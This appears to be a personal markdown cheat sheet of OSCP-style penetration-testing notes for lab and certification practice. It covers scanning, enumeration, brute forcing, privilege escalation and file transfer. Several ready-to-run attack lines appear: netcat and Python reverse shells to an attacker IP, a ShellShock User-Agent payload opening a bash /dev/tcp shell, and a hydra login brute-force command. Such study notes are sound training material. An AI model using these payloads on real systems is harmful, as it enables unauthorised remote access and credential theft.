

### TOC

<!-- MarkdownTOC -->

- [Nmap + Initial Enumeration](#nmap--initial-enumeration)
	- [Nmap Vulnerability Scan Scripts](#nmap-vulnerability-scan-scripts)
	- [Initial Port Info Gathering](#initial-port-info-gathering)
	- [Searchsploit](#searchsploit)
	- [DNS + etc/hosts](#dns--etchosts)
		- [Zone Transfer](#zone-transfer)
	- [Nmap Automator](#nmap-automator)
- [Web Enumeration](#web-enumeration)
	- [Enumerate Directories](#enumerate-directories)
	- [Identify Software in Use](#identify-software-in-use)
- [Port Enumeration](#port-enumeration)
	- [Port 53 - DNS](#port-53---dns)
	- [Port 139 & 445 - SMB](#port-139--445---smb)
- [Login Brute Forcing](#login-brute-forcing)
- [Reverse Shells](#reverse-shells)
	- [Upgrading Shells](#upgrading-shells)
- [Privilege Escalation](#privilege-escalation)
	- [Linux](#linux)
		- [sudo -l](#sudo--l)
		- [LinEnum](#linenum)
			- [Crontab](#crontab)
		- [pspy](#pspy)
- [File Transfer](#file-transfer)
- [Other Vulnerabilities](#other-vulnerabilities)
	- [ShellShock](#shellshock)
	- [Hijack Module/File Used by Script](#hijack-modulefile-used-by-script)
	- [Stenography Challenge](#stenography-challenge)
	- [SUID - SystemCtl](#suid---systemctl)
- [Miscellaneous](#miscellaneous)
	- [Python SSL Issue](#python-ssl-issue)

<!-- /MarkdownTOC -->



<br><br>

* This file will contain summarized notes for all things OSCP like hacking.


<br><br>

### Nmap + Initial Enumeration

* Initial scan:

```
nmap -sC -sV -O -oA nmap/initial <IP>
```

* All ports scan:

```
nmap -sC -sV -O -p1–65535 -oA nmap/full <IP>
```

* UDP scan:

```
nmap -sU -O -oA nmap/udp <IP>
```

<br>

#### Nmap Vulnerability Scan Scripts


```
nmap --script vuln <IP>
```

* Run the script vuln scanner on specific ports:

```
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor <IP>
```

<br>


#### Initial Port Info Gathering


* When there are many ports that are opened, it is a good idea to make initial notes about each port if possible.

* For example:

* Identify if the SSH version is running an old version.  Do this for any service identified

* If there ports running mail protocols, understand we may need to find a valid email before moving forward with those ones

* Research different ports and their identified services, and confirm if there is a tool that can be used for enumeration.  Like a port running RPCbind, there is a command called rpcinfo to begin enumeration


<br>


#### Searchsploit

* This tool can be used to determine if the software is associated with any vulnerabilities.

* Example, the application is using an off the shelf software called Elastix:

```
searchsploit elastix | grep 4\\.8\\.
```

* Transfer the exploit to attacker machine:

```
searchsploit -m 18650
```

* Review the script and identify what changes need to be done on it before executed the script.


<br>


#### DNS + etc/hosts

* The following command can attempt to find domain name:

```
nslookup <IP>
```

<br>


##### Zone Transfer

* Command for a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is.

```
host -l <domain-name> <dns_server-address>
```

<br>

#### Nmap Automator

* Link - https://github.com/21y4d/nmapAutomator


<br><br>


### Web Enumeration

* Begin by enumerating the web application or port 80/443 first to identify any foot holds.


<br>

#### Enumerate Directories

```
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP>
```

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
```

<br>

#### Identify Software in Use

* Identify software that is being used by the application and then use "searchsploit" to check if it contains any vulnerabilities, for example



<br><br>


### Port Enumeration


#### Port 53 - DNS

* When this port is open we can get the domain name through nslookup and attempt a zone transfer to enumerate name servers, hostnames, etc.


#### Port 139 & 445 - SMB

* Run smbmap to list available shares and permissions.

```
smbmap -H <IP>
```

* List the content of the shares.

```
smbmap -R -H <IP>
```

<br>

* Use smbclient to view more information about the shares.

```
smbclient -L //<IP>
```

* Login anonymously (without a password) into the general share.

```
smbclient //<IP>/general -N
```

* Download the creds.txt file from the target machine to the attack machine.

```
get creds.txt
```


<br><br>

### Login Brute Forcing

* Hydra command to brute force password:

```
hydra -l 'admin' -P /usr/share/john/password.lst admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
```


<br><br>


### Reverse Shells

* Setting up a reverse shell

* Set up in attacker machine:

```
nc -nlvp 4444
```

* Set up target machine:

```
nc -nv <Attacker IP> 4444 -e /bin/sh
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<br>

#### Upgrading Shells


* Once you get a shell for victim machine, we can upgrade it to make it more interactive:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

* To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```
stty raw -echo
```

* Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```
export TERM=xterm
```


<br><br>

### Privilege Escalation


<br>

#### Linux


<br>


##### sudo -l

* Following command lists the allowed commands for my user:

```
sudo -l
```

* The following command can be used to change to another user (in this case we didn't need to know their password):

```
sudo -i -u <user name>
```

<br>


##### LinEnum

* https://github.com/rebootuser/LinEnum

* Download script to victim machine using Python Simple Server and Wget, then give it execution permissions and run it


<br>

###### Crontab

* https://tigr.net/3203/2014/09/13/getting-wordpress-cron-work-in-multisite-environment/

* This section of the LinEnum tool will show what files are being run as a cron job, if there are any files where we can write into, and are executed as root, we can gain a reverse shell as root by modifying the file


<br>


##### pspy


 * Link - https://github.com/DominicBreuker/pspy


<br><br>


### File Transfer

* Start a simple HTTP server on the system where the file is already located:

```
python -m SimpleHTTPServer 9005
```

* Use wget on the system where we want to download file to:

```
wget http://10.10.14.30:9005/test.py
```


<br><br>


### Other Vulnerabilities


#### ShellShock

* Change the User Agent field to the following string. - http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell

```
() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

<br>


#### Hijack Module/File Used by Script

* If you identify a script that is running a library/file, identify if you have write access to the file, then you can upload a reverse shell in there for example


<br>

#### Stenography Challenge

```
apt-get install steghide
```

```
steghide extract -sf <JPG Image File Name>
```


<br>


#### SUID - SystemCtl


* Link - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49



<br><br>


### Miscellaneous


<br>

#### Python SSL Issue

* If there is an issue with "SSL unsupported protocol error" when running a python script, this write up contains a work around - https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/beep-writeup-w-o-metasploit.md



